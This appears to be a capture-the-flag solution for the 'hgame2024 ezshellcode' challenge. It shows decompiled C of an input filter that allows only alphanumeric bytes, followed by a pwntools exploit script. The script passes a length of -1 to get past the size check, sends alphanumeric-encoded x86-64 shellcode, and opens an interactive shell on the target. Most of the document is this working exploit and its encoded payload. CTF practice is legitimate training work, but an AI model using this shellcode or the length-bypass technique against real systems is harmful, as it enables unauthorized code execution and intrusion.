"""
// hgame2024 ezshellcode
unsigned __int64 __fastcall myread(void *a1, unsigned int a2)
{
  char v3; // [rsp+1Fh] [rbp-11h]
  unsigned int i; // [rsp+20h] [rbp-10h]
  unsigned int v5; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v5 = read(0, a1, a2);
  for ( i = 0; i < v5; ++i )
  {
    v3 = *((_BYTE *)a1 + i);
    if ( (v3 <= '`' || v3 > 'z') && (v3 <= '@' || v3 > 'Z') && (v3 <= 47 || v3 > 57) )
    {
      puts("Invalid character\n");
      exit(1);
    }
  }
  return v6 - __readfsqword(0x28u);
}
"""
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
p = process('./vuln')
# p = remote('192.168.189.132', 9999)
p.sendlineafter("input the length of your shellcode:", b'-1')
shellcode = b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
p.sendafter("input your shellcode:", shellcode)
p.interactive()
